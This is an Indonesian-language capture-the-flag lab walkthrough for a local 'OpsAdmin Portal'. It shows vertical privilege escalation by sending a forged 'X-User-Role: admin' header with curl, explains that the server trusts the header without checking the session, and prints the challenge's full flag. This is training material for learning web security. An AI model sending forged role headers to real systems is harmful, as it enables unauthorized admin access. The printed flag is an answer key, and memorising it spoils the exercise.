# Panduan Praktik Terbimbing: Investigasi Vertical Privilege Escalation & Header Role Manipulation

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **OpsAdmin Portal** pada `http://127.0.0.1:8041`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8041/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A01-02","port":8041,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8041/`
3. Amati antarmuka operasional **OpsAdmin Portal** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Vertical Privilege Escalation & Header Role Manipulation)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -H "X-User-Role: admin" http://127.0.0.1:8041/api/admin/dashboard
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `X-User-Role: admin` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8041/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8041/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A01-02","flag":"ZITERA{v3rt1c4l_pr1v_3sc4l4t10n_h34d3r_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{v3rt1c4l_pr1v_3sc4l4t10n_h34d3r_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
